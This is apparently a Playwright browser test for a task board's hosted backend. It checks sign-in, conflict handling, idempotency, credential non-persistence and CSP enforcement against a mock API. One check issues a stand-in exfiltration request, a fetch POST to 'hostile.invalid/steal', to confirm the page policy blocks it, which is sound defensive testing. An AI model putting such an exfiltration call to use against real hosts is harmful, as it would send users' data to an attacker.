'use strict';
const assert = require('node:assert/strict');
const http = require('node:http');
const fs = require('node:fs');
const path = require('node:path');
const { chromium } = require('playwright');
const ROOT = path.resolve(__dirname, '../..');
const BOARD = '30000000-0000-4000-8000-000000000001';
const ACTOR = { user_id: '10000000-0000-4000-8000-000000000001', agent_id: null };
const TOKEN = 'synthetic-hosted-jwt-never-to-github';
const clone = x => JSON.parse(JSON.stringify(x));
const FIXTURE_FILES = {"tasks.json": {"version": 4, "layout": "split", "next_num": 900000, "columns": [{"id": "backlog", "name": "Backlog"}, {"id": "todo", "name": "To do"}, {"id": "in-progress", "name": "In progress"}, {"id": "pending-review", "name": "Pending review"}, {"id": "done", "name": "Done"}], "people": [{"github": "synthetic-a", "name": "Example A"}, {"github": "synthetic-b", "name": "Example B"}], "settings": {"max_agent_claims": 2, "stale_after_minutes": 30, "review_inbox": {"enabled": true}}, "archive": {"files": {"2025": {"tasks": 1, "contacts": 0}}}, "x-synthetic": {"absent-is-not-null": null, "ordered": [2, 1]}, "x-keeptrack-hosted-attribution": {"version": 1, "records": {"cards/t_sample.json#": {"createdBy": {"user_id": "10000000-0000-4000-8000-000000000001", "agent_id": "20000000-0000-4000-8000-000000000001"}, "updatedBy": {"user_id": "10000000-0000-4000-8000-000000000001", "agent_id": "20000000-0000-4000-8000-000000000001"}}, "archive/2025.json#/tasks/0": {"createdBy": {"user_id": "10000000-0000-4000-8000-000000000001", "agent_id": "20000000-0000-4000-8000-000000000001"}, "updatedBy": {"user_id": "10000000-0000-4000-8000-000000000001", "agent_id": "20000000-0000-4000-8000-000000000001"}, "on_behalf_of": "10000000-0000-4000-8000-000000000002"}, "archive/2025.json#/tasks/0/comments/0": {"createdBy": {"user_id": "10000000-0000-4000-8000-000000000001", "agent_id": "20000000-0000-4000-8000-000000000001"}, "updatedBy": {"user_id": "10000000-0000-4000-8000-000000000001", "agent_id": "20000000-0000-4000-8000-000000000001"}, "on_behalf_of": "10000000-0000-4000-8000-000000000002"}}, "changes": [{"actor": {"user_id": "10000000-0000-4000-8000-000000000001", "agent_id": "20000000-0000-4000-8000-000000000001"}, "command": "claim", "at": "2026-01-02T03:04:05.000+00:00", "on_behalf_of": "10000000-0000-4000-8000-000000000002", "paths": ["archive/2025.json"]}]}}, "cards/t_sample.json": {"id": "t_sample", "num": 17, "title": "Synthetic contract sample", "column": "backlog", "rank": "a0", "details": "Only invented content.", "assignees": ["synthetic-a"], "todos": [{"id": "d_one", "text": "Check synthetic example", "done": false}], "links": [], "contacts": ["p_sample"], "project": "pr_sample", "value": 4, "effort": "M", "created": "2026-01-02T03:04:05.000+00:00", "updated": "2026-01-02T03:04:05.000+00:00", "comments": [{"id": "c_one", "text": "Invented comment", "by": "example-agent@synthetic-a", "at": "2026-01-02T03:04:05.000+00:00", "actor": {"user_id": "10000000-0000-4000-8000-000000000001", "agent_id": "20000000-0000-4000-8000-000000000001"}}], "history": [{"at": "2026-01-02T03:04:05.000+00:00", "by": "example-agent@synthetic-a", "text": "Created", "actor": {"user_id": "10000000-0000-4000-8000-000000000001", "agent_id": "20000000-0000-4000-8000-000000000001"}}], "x-sample": {"null": null, "ordered": [3, 1, 2]}}, "people/p_sample.json": {"id": "p_sample", "name": "Synthetic Person", "company": "Example Company", "stage": "New", "next": "Review invented material", "next_due": "2026-02-01", "links": [], "comments": [], "history": [], "x-sample": null}, "projects/pr_sample.json": {"id": "pr_sample", "name": "Synthetic Project", "client": "Example Company", "people": ["p_sample"], "status": "active", "links": []}, "proposals/r_sample.json": {"id": "r_sample", "version": 1, "kind": "task.create", "status": "pending", "title": "Synthetic proposal", "action_key": "synthetic-action", "work_key": "synthetic-work", "change": {"title": "Invented task"}, "target": null, "decision": null, "history": [], "createdBy": "legacy-example"}, "archive/2025.json": {"version": 3, "archive": true, "year": "2025", "tasks": [{"id": "t_old", "num": 2, "title": "Synthetic contract sample", "column": "done", "rank": "a0", "details": "Only invented content.", "assignees": ["synthetic-a"], "todos": [], "links": [], "contacts": [], "project": "", "value": 4, "effort": "M", "created": "2026-01-02T03:04:05.000+00:00", "updated": "2026-01-02T03:04:05.000+00:00", "comments": [{"id": "c_old", "text": "Archived invented comment", "at": "2026-01-02T03:04:05.000+00:00", "actor": {"user_id": "10000000-0000-4000-8000-000000000001", "agent_id": "20000000-0000-4000-8000-000000000001"}, "on_behalf_of": "10000000-0000-4000-8000-000000000002"}], "history": [], "x-sample": {"null": null, "ordered": [3, 1, 2]}}], "contacts": [], "history": {"t_old": [{"at": "2026-01-02T03:04:05.000+00:00", "text": "Old history", "actor": {"user_id": "10000000-0000-4000-8000-000000000001", "agent_id": "20000000-0000-4000-8000-000000000001"}, "on_behalf_of": "10000000-0000-4000-8000-000000000002"}]}, "x-preserve": {"empty": [], "null": null}}};
let files, revs, version, calls, receipts, conflict, lockRetry, denyApprove, omit, changed, expired;
function reset() { files = clone(FIXTURE_FILES); revs = Object.fromEntries(Object.keys(files).map(p => [p, 'r1-' + p])); version = 1; calls = []; receipts = new Map(); conflict = lockRetry = denyApprove = changed = expired = false; omit = true; }
reset();
const file = p => ({ path: p, body: clone(files[p]), rev: revs[p], createdBy: ACTOR, updatedBy: ACTOR });
function snapshot() {
  const root = file('tasks.json'); delete root.path;
  const entities = Object.keys(files).filter(p => /^(cards|people|projects|proposals)\//.test(p)).map(p => {
    const e = file(p); delete e.path; e.kind = { cards: 'card', people: 'person', projects: 'project', proposals: 'proposal' }[p.split('/')[0]];
    if (omit && e.kind === 'card') { e.omitted = ['history', 'comments']; delete e.body.history; delete e.body.comments; } return e;
  });
  return { schema: 4, board_id: BOARD, root, entities, claims: [], cursor: 'c' + version,
    capabilities: { casWrites: true, atomicMultiFile: true, changeFeed: true, phase: '0', lazyHistory: omit, teamDocuments: true,
      commands: ['create-card', 'claim', 'heartbeat', 'release', 'move', 'done', 'review', 'archive', 'unarchive', 'approve', 'comment'] } };
}
const server = http.createServer(async (req, res) => {
  const u = new URL(req.url, 'http://local');
  const send = (body, status = 200) => { res.writeHead(status, { 'Content-Type': 'application/json', 'Cache-Control': 'no-store' }); res.end(JSON.stringify(body)); };
  const error = (code, status) => send({ error: { code, message: 'Synthetic refusal', request_id: 'test', retryable: code === 'lock_retry' } }, status);
  if (u.pathname.startsWith('/v1/') || u.pathname.startsWith('/auth/')) {
    let raw = ''; for await (const chunk of req) raw += chunk;
    const body = raw ? JSON.parse(raw) : undefined; calls.push({ method: req.method, url: req.url, headers: req.headers, body });
    if (u.pathname === '/auth/v1/token') return send({ access_token: TOKEN, refresh_token: 'must-not-persist' });
    if (expired) return error('invalid_credential', 401);
    assert.equal(req.headers.authorization, 'Bearer ' + TOKEN);
    if (u.pathname === '/v1/me') return send({ ...ACTOR, boards: [{ id: BOARD, role: 'editor', handle: 'synthetic-a' }], token_scopes: ['read', 'write', 'claim'] });
    const suffix = u.pathname.replace('/v1/boards/' + BOARD, '');
    if (suffix === '/snapshot') return send(snapshot());
    if (suffix.startsWith('/files/')) { const p = decodeURIComponent(suffix.slice(7)); return files[p] ? send(file(p)) : error('not_found', 404); }
    if (suffix === '/changes') {
      const batches = changed ? [{ cursor: 'c' + version, changes: [{ resource: 'file', path: 'cards/t_sample.json', rev: revs['cards/t_sample.json'], op: 'upsert', body: clone(files['cards/t_sample.json']) }] }] : [];
      changed = false; return send({ through: 'c' + version, has_more: false, batches });
    }
    if (req.method === 'POST') {
      const key = req.headers['idempotency-key']; assert.match(key, /^[\da-f-]{36}$/);
      if (receipts.has(key)) return send(receipts.get(key));
      if (lockRetry) { lockRetry = false; return error('lock_retry', 503); }
      if (conflict) { conflict = false; files['cards/t_sample.json'].title = 'Their changed title'; revs['cards/t_sample.json'] = 'concurrent-r2'; return error('revision_conflict', 412); }
      const updates = []; let result;
      if (suffix === '/commits') {
        for (const op of body.ops) {
          if (op.baseRev !== revs[op.path]) return error('revision_conflict', 412);
          assert.deepEqual(op.body.history, files[op.path].history, 'replacement preserves omitted history');
          assert.deepEqual(op.body.comments, files[op.path].comments, 'replacement preserves omitted comments');
          files[op.path] = clone(op.body); revs[op.path] = 'r' + ++version + '-' + op.path; updates.push({ path: op.path, rev: revs[op.path] });
        }
      } else if (suffix === '/commands') {
        if (body.kind === 'approve' && denyApprove) return error('insufficient_scope', 403);
        if (body.kind === 'create-card') {
          assert.equal(body.card.num, undefined); const c = { ...body.card, num: files['tasks.json'].next_num++ };
          files['cards/' + c.id + '.json'] = c; revs['cards/' + c.id + '.json'] = 'new'; result = { card_id: c.id, num: c.num };
        } else if (body.kind === 'comment') {
          files['cards/' + body.card_id + '.json'].comments.push({ id: 'c_new', text: body.text, by: 'synthetic-a', actor: ACTOR, at: '2026-10-15T12:00:00Z' });
          result = { comment_id: 'c_new', actor: ACTOR, at: '2026-10-15T12:00:00Z' };
        } else {
          const card = files['cards/' + body.card_id + '.json']; card.column = body.kind === 'approve' ? 'todo' : body.column;
          result = { card_id: body.card_id, column: card.column, claim_ended: false };
        }
        version++;
      } else return error('not_found', 404);
      const response = { cursor: 'c' + version, files: updates, ...(result ? { result } : {}) }; receipts.set(key, response); return send(response);
    }
    return error('not_found', 404);
  }
  const rel = decodeURIComponent(u.pathname).replace(/^\/+/, '') || 'board/index.html';
  const target = path.resolve(ROOT, rel); if (!target.startsWith(ROOT + path.sep)) { res.writeHead(403).end(); return; }
  fs.readFile(target, (e, data) => { if (e) res.writeHead(404).end(); else { res.setHeader('Content-Type', { '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css', '.json': 'application/json', '.svg': 'image/svg+xml' }[path.extname(target)] || 'application/octet-stream'); res.end(data); } });
});
(async () => {
  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve)); const base = 'http://127.0.0.1:' + server.address().port;
  const browser = await chromium.launch({ headless: true }); let passed = 0;
  const ok = name => { passed++; console.log('PASS ' + name); };
  try {
    const page = await browser.newPage(); const errors = [], github = [], csp = [];
    page.on('pageerror', e => errors.push(e.message));
    page.on('request', req => { const host = new URL(req.url()).hostname; if (/(^|\.)(github\.com|githubusercontent\.com|githubassets\.com)$/.test(host)) github.push({ url: req.url(), headers: req.headers(), body: req.postData() }); });
    await page.route('https://api.github.com/**', r => r.abort());
    await page.addInitScript(() => { localStorage.setItem('kb_token', 'existing-github-secret'); localStorage.setItem('kb_repo', 'acme/board'); localStorage.setItem('kb_me', 'forged'); localStorage.setItem('kb_view', 'board'); sessionStorage.setItem('kb_view', 'board'); });
    await page.goto(`${base}/board/index.html?backend=hosted&api=${encodeURIComponent(base)}&auth=${encodeURIComponent(base)}&board=${BOARD}`);
    await page.locator('#hostedSignIn').waitFor();
    assert.equal(calls.length, 0, 'hosted boot does not read GitHub or private data before sign-in');
    await page.locator('#hostedKey').fill('synthetic-publishable'); await page.locator('#hostedEmail').fill('synthetic@example.test'); await page.locator('#hostedPassword').fill('synthetic-password'); await page.locator('#hostedSignIn').click();
    await page.getByText('Synthetic contract sample', { exact: true }).first().waitFor();
    assert.ok(calls.some(c => c.url === '/v1/me')); assert.ok(calls.some(c => c.url.includes('/files/cards%2Ft_sample.json')));
    ok('sign-in, verified identity, snapshot and omitted-history hydration');

    await page.evaluate(() => { location.hash = '#17'; }); await page.locator('#dlgCard[open]').waitFor();
    lockRetry = true;
    await page.locator('#cTitle').fill('My synthetic title'); await page.locator('#cTitle').blur();
    await page.waitForFunction(() => document.getElementById('status').textContent.startsWith('Saved'));
    assert.equal(files['cards/t_sample.json'].title, 'My synthetic title');
    assert.deepEqual(files['cards/t_sample.json'].history, FIXTURE_FILES['cards/t_sample.json'].history);
    assert.ok(calls.some(c => c.url.endsWith('/commits') && c.body.ops[0].baseRev));
    const firstPosts = calls.filter(c => c.url.endsWith('/commits'));
    assert.equal(firstPosts.length, 2); assert.equal(firstPosts[0].headers['idempotency-key'], firstPosts[1].headers['idempotency-key']);
    ok('UI field commit carries captured revision, preserves audit/history and reuses its key on 503');

    conflict = true;
    await page.locator('#cTitle').fill('My conflict choice'); await page.locator('#cTitle').blur();
    await page.locator('#dlgConflict[open]').waitFor({ timeout: 10000 });
    await page.locator('#cfBody input[value="mine"]').check(); await page.locator('#cfApply').click();
    await page.waitForFunction(() => document.getElementById('status').textContent.startsWith('Saved'));
    assert.equal(files['cards/t_sample.json'].title, 'My conflict choice');
    const commits = calls.filter(c => c.url.endsWith('/commits')); assert.notEqual(commits.at(-1).headers['idempotency-key'], commits.at(-2).headers['idempotency-key']);
    ok('412 reloads and uses existing conflict choices with a fresh mutation key');

    files['cards/t_sample.json'].details = 'Polled synthetic detail'; revs['cards/t_sample.json'] = 'poll-r3'; version++; changed = true;
    await page.waitForFunction(() => document.getElementById('cDescView').textContent.includes('Polled synthetic detail'), { timeout: 10000 });
    assert.ok(calls.some(c => c.url.includes('/changes?after='))); ok('cursor polling updates the open drawer');

    const adapterResult = await page.evaluate(async ({ base, board }) => {
      const a = new KeeptrackHosted.HostedAdapter({ api: base, board });
      await a.signIn({ auth: base, key: 'synthetic', email: 'synthetic@example.test', password: 'synthetic' }); await a.snapshot();
      const command = { kind: 'comment', card_id: 't_sample', baseRev: a.files.get('cards/t_sample.json').rev, text: 'Replay once' }, key = crypto.randomUUID();
      const first = await a.command(command, key), second = await a.command(command, key); a.logout(); return { first, second, signedIn: a.signedIn, size: a.files.size };
    }, { base, board: BOARD });
    assert.deepEqual(adapterResult.first, adapterResult.second); assert.equal(adapterResult.signedIn, false); assert.equal(adapterResult.size, 0);
    assert.equal(files['cards/t_sample.json'].comments.filter(c => c.text === 'Replay once').length, 1);
    ok('idempotency replay and logout clear adapter state');

    denyApprove = true;
    const refusal = await page.evaluate(async ({ base, board }) => {
      const a = new KeeptrackHosted.HostedAdapter({ api: base, board });
      await a.signIn({ auth: base, key: 'synthetic', email: 'synthetic@example.test', password: 'synthetic' }); await a.snapshot();
      try { await a.command({ kind: 'approve', card_id: 't_sample', baseRev: a.files.get('cards/t_sample.json').rev }, crypto.randomUUID()); }
      catch (e) { return { status: e.status, code: e.code }; }
    }, { base, board: BOARD });
    assert.deepEqual(refusal, { status: 403, code: 'insufficient_scope' }); denyApprove = false;
    const unsafe = await page.evaluate(board => {
      try { new KeeptrackHosted.HostedAdapter({ api: 'https://api.github.com', board }); return false; } catch { return true; }
    }, BOARD);
    assert.equal(unsafe, true); ok('unscoped approval surfaces 403 and GitHub cannot be an API endpoint');

    const leaked = await page.evaluate(async token => {
      const entries = Object.entries(localStorage).concat(Object.entries(sessionStorage));
      const db = await new Promise(resolve => { const r = indexedDB.open('keeptrack', 1); r.onsuccess = () => resolve(r.result); r.onerror = () => resolve(null); r.onupgradeneeded = () => r.result.createObjectStore('kv'); });
      let values = []; if (db) { values = await new Promise(resolve => { const tx = db.transaction('kv'), r = tx.objectStore('kv').getAll(); r.onsuccess = () => resolve(r.result); }); db.close(); }
      return JSON.stringify([entries, values]).includes(token);
    }, TOKEN);
    assert.equal(leaked, false); assert.equal(github.length, 0); ok('X3: no hosted credential in persistence or any GitHub request');

    await page.evaluate(() => { window.__cspViolations = []; document.addEventListener('securitypolicyviolation', e => window.__cspViolations.push(e.blockedURI)); });
    const hostile = await page.evaluate(async () => { try { await fetch('https://hostile.invalid/steal', { method: 'POST', body: 'synthetic' }); return false; } catch { return true; } });
    assert.equal(hostile, true); assert.ok((await page.evaluate(() => window.__cspViolations)).some(x => x.includes('hostile.invalid'))); ok('actual CSP blocks hostile origins');

    await page.locator('#cClose').click(); await page.locator('#dlgCard').waitFor({ state: 'hidden' }); await page.reload(); await page.locator('#hostedSignIn').waitFor();
    assert.equal(await page.locator('#hostedPassword').inputValue(), ''); assert.equal(errors.length, 0, errors.join('\n')); ok('reload requires sign-in and browser has no page errors');
    const second = await browser.newPage();
    await second.addInitScript(() => { sessionStorage.setItem('kb_view', 'board'); localStorage.setItem('kb_layout', 'classic'); });
    const secondBase = base.replace('127.0.0.1', 'localhost');
    await second.goto(`${secondBase}/board/index.html?backend=hosted&api=${encodeURIComponent(secondBase)}&auth=${encodeURIComponent(secondBase)}&board=${BOARD}`);
    await second.locator('#hostedKey').fill('synthetic'); await second.locator('#hostedEmail').fill('synthetic@example.test'); await second.locator('#hostedPassword').fill('synthetic'); await second.locator('#hostedSignIn').click();
    await second.getByText('My conflict choice', { exact: true }).first().waitFor();
    const policy = await second.locator('head > meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
    assert.match(policy, /http:\/\/localhost:54321/); assert.ok(!policy.includes('https://api.github.com'));
    await second.close(); ok('second localhost origin signs in under a policy with GitHub blocked');
    console.log(`${passed} hosted browser checks passed`);
  } finally { await browser.close(); await new Promise(resolve => server.close(resolve)); }
})().catch(e => { console.error(e); process.exitCode = 1; server.close(); });
